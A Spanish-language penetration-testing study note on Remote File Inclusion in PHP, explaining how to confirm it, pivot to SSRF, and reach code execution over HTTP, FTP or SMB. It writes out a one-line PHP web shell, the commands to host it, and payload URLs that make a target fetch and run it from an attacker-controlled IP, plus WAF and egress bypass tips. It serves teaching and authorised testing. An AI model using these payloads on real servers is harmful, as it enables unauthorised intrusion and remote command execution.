---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Inclusion
Descripción: "Cuando la función vulnerable admite URLs remotas, la inclusión deja de limitarse a ficheros locales: podemos hacer que el servidor descargue e incluya un fichero que nosotros…"
Fecha de actualización: 2026-06-22
Nota previa: "[[04 - PHP wrappers II - RCE y filter chains]]"
Nota siguiente: "[[06 - LFI + File Upload a RCE]]"
Area: "[[File Inclusion.base|File Inclusion]]"
---
---

Cuando la función vulnerable admite **URLs remotas**, la inclusión deja de limitarse a ficheros locales: podemos hacer que el servidor descargue e incluya un fichero que **nosotros alojamos**. Eso es `Remote File Inclusion` (RFI). <mark style="background: #ADCCFFA6;">Casi toda RFI es también una LFI, pero no al revés</mark>: incluir una URL remota es estrictamente más permisivo que incluir una ruta local.

# RFI da dos ganancias, no una

- <mark style="background: #FFB86CA6;">**RCE**: incluir un script malicioso propio</mark> que la función ejecuta — la vía más directa a comando remoto, sin depender de logs, uploads ni credenciales filtradas.
- **SSRF**: incluir una URL `http://127.0.0.1:<puerto>/` enumera servicios y apps que solo escuchan en local. Esto funciona **aunque la función no ejecute código** (p. ej. `file_get_contents`): no hay RCE, pero sí lectura de servicios internos. El abanico completo de esta técnica está en [[01 - Introducción a SSRF|SSRF]].

# Por qué casi toda RFI es LFI (y no al revés)

| Función | Lee | Ejecuta | URL remota |
| - | :-: | :-: | :-: |
| **PHP** `include()` / `include_once()` | ✅ | ✅ | ✅ |
| **PHP** `require()` / `require_once()` | ✅ | ✅ | ✅ |
| **PHP** `file_get_contents()` | ✅ | ❌ | ✅ (→ solo SSRF) |
| **Java** `import` | ✅ | ✅ | ✅ |
| **.NET** `@Html.RemotePartial()` | ✅ | ❌ | ✅ (→ solo SSRF) |
| **.NET** `include` | ✅ | ✅ | ✅ |

Una LFI no llega a RFI por tres motivos, y <mark style="background: #FFB8EBA6;">los tres son habituales hoy</mark>:

1. La función no admite URLs remotas (`require`, `fopen`, `file`…).
2. Solo controlamos **parte** del nombre, no el esquema del wrapper (`http://`, `ftp://`). Si el código antepone un prefijo o nuestra entrada va a mitad de la ruta, no podemos imponer `http://`.
3. La configuración lo prohíbe. En PHP, la RFI exige `allow_url_include = On`, <mark style="background: #FF5582A6;">desactivado por defecto desde PHP 5.2</mark>. Por eso la RFI "pura" es rara en objetivos modernos —y cuando aparece, suele ser por un plugin/tema que la activó—.

# Verificar que hay RFI

Leer `php.ini` con el [[03 - PHP wrappers I - php filter y disclosure de código|filtro base64]] y comprobar `allow_url_include` da una pista, pero **no es fiable**: aunque esté `On`, la función puede no admitir URLs. La prueba real es **intentar incluir una URL** y ver si se trae el contenido. Empieza **siempre por una URL local** para no chocar con un firewall de salida ni con un WAF:

```
/index.php?language=http://127.0.0.1:80/index.php
```

Si la página se incluye y, además, se **ejecuta** como PHP (en vez de mostrarse como código), la función tiene capacidad de ejecución → vía directa a RCE. Si solo controlamos un puerto, ya tenemos un primitivo SSRF para barrer servicios internos.

> [!warning]+ No te auto-incluyas
> Incluir la propia página vulnerable (`index.php`) puede provocar un bucle de inclusión recursiva y tumbar el servidor (DoS). Para probar RFI local, apunta a un recurso distinto o a un puerto interno conocido.

# RCE: hospedar el script e incluirlo

El script es un web shell mínimo en el lenguaje de la app (PHP aquí):

```shell-session
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Lo servimos y lo incluimos por su URL, pasando el comando con `&cmd=`. Hay tres transportes según el escenario:

| Transporte | Requiere `allow_url_include` | Cuándo usarlo |
| - | :-: | - |
| **HTTP** | ✅ | Caso general. Escucha en `80`/`443`: suelen estar permitidos en el egress aunque haya firewall de salida. |
| **FTP** | ✅ | Si el WAF bloquea `http://` o los puertos HTTP están filtrados. |
| **SMB** | ❌ (en Windows) | Servidor **Windows**: no necesita la directiva activada. |

## HTTP

```shell-session
$ sudo python3 -m http.server 80
```

```
/index.php?language=http://<NUESTRA_IP>:80/shell.php&cmd=id
```

> [!tip]+ Revisa la petición entrante
> Mira el log de tu servidor: si ves que el target añade una extensión (`shell.php.php`) o reescribe la URL, ajusta el payload (p. ej. omite la `.php`). Es el mismo razonamiento que con la [[01 - Local File Inclusion (LFI)|extensión añadida]] en LFI.

## FTP

```shell-session
$ sudo python3 -m pyftpdlib -p 21
```

```
/index.php?language=ftp://<NUESTRA_IP>/shell.php&cmd=id
```

PHP intenta autenticarse como anónimo por defecto; si el servidor exige credenciales, van en la URL: `ftp://user:pass@<NUESTRA_IP>/shell.php`. El valor de FTP es esquivar filtros que solo contemplan `http(s)://`.

## SMB (solo Windows)

<mark style="background: #8000E1A6;">En un servidor Windows no hace falta `allow_url_include`</mark>: Windows trata los ficheros de un recurso SMB remoto como ficheros normales referenciables por ruta UNC. Levantamos el recurso con Impacket (permite auth anónima por defecto):

```shell-session
$ impacket-smbserver -smb2support share $(pwd)
```

```
/index.php?language=\\<NUESTRA_IP>\share\shell.php&cmd=whoami
```

<mark style="background: #FFB8EBA6;">Funciona mucho mejor en la misma red</mark>: el acceso a SMB remoto sobre internet suele estar bloqueado por defecto en las configuraciones modernas de Windows y en los firewalls perimetrales.

# Gotchas de producción

- **Egress filtering**: en cloud (AWS/GCP/Azure) muchos hosts no tienen salida a internet. El RFI por HTTP hacia tu VPS **fallará**; necesitas un servidor accesible *dentro* de la red del target (pivote) o caer al SSRF interno. Antes de dar por muerta la RFI, prueba a incluir un recurso interno.
- **WAF**: si bloquea `http://`/`https://`, prueba `ftp://`, SMB (Windows), o trucos estilo SSRF (IP en decimal/hexadecimal, `//host`, redirecciones). El [[02 - Bypasses básicos - traversal, null byte y encoding|encoding]] de la cadena del esquema también ayuda.
- **`data://` no es RFI** pero cumple un rol parecido (inyectar código sin alojar un fichero) y depende igualmente de `allow_url_include`: ver [[04 - PHP wrappers II - RCE y filter chains|wrappers II]]. Si la RFI clásica está capada, las [[04 - PHP wrappers II - RCE y filter chains|filter chains]] dan RCE **sin** `allow_url_include` y sin salida a internet — suelen ser mejor apuesta en objetivos endurecidos.

> [!info]+ Fuentes
> - [OWASP WSTG — Testing for Remote File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)
> - [PHP — `allow_url_include`](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include)
> - [HackTricks — LFI/RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion) · [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

Cuando no podemos alojar un fichero remoto pero **sí subir uno** al propio servidor, el upload se convierte en el vehículo de la inclusión: [[06 - LFI + File Upload a RCE]].
